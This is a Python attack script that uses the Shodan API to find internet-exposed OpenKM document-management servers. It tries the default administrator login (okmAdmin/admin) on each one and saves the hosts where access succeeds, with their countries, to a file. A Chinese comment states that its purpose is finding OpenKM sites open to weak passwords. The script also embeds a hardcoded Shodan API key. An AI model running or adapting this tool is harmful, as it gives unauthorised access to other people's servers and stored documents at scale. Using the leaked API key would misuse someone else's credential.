#!/usr/bin/env python
# coding=utf-8
import shodan
import requests
import logging

USERNAME = 'okmAdmin'
PASSWORD = 'admin'

def search_openkm(API_KEY):
	logging.info("api key:" + API_KEY)
	api = shodan.Shodan(API_KEY)
	results = api.search("openkm")
	logging.debug(results)
	logging.info(results['total'])
	total = results['total']
	logging.info("search finish!")
#	return iplist
	return results

def deal_results(shodan_results):
	results = []
	for item in shodan_results['matches']: 
		logging.debug(item)
		url_str = str(item['ip_str']) + ':' + str(item['port'])
		country_str = item['location']['country_name']
		logging.info(url_str + '  ' + country_str)
		results.append({'host':url_str,'country':country_str})
	logging.debug(results)
	return results

def check_login(host):
	login_url = '/OpenKM/j_spring_security_check'
	url = 'http://' + host + login_url
	data ={
		'j_username':'okmAdmin',
	 	'j_password':'admin',
	 	'submit':'登录'
	}
	try:
		test_session = requests.Session()
		response = test_session.post(url,data)
		if response.url.find("index.jsp") == -1:
			logging.info(host + ' login fail')
			return False
		else:
			logging.info(host + ' login success')
			return True
	except Exception as e:
		logging.error(e)

def main():
	SHODAN_API_KEY = 'wKVILEwGhBalnpICFKwCzBblwLmYJe9R'
	summary = {'total':0,'success':0,'fail':0,'success_list':[],'fail_list':[]}
	shodan_results = search_openkm(SHODAN_API_KEY)
	summary['total'] = shodan_results['total']
	results = deal_results(shodan_results)
	for result in results:
		host = result['host']
		country = result['country']
		if check_login(host):
			summary['success_list'].append(host + ' ' + country +'\n')
			summary['success'] += 1
		else:
			summary['fail_list'].append(host+'\n')
			summary['fail'] += 1
	write_file(summary['success_list'],"success")
	write_file(summary['fail_list'],"fail")
	print(str(summary['success']) + '/' + str(summary['total']))
	#logging.info(str(count_success) +  + str(total))

def write_file(list,file_name):
	logging.info("write list :" + file_name)
	file = open(file_name + '.txt','w+')
	try:
		file.writelines(list)
	except Exception as e:
		logging.debug(e)
	finally:
		file.close()

if __name__ == '__main__':
	#自动在shodan寻找openkm弱密码可以登录的域名
	log_file = "./basic_logger.log"
	logging.basicConfig(filename = log_file, level = logging.INFO)
	logging.info("mission start!")
	main()
	logging.info("mission finish!")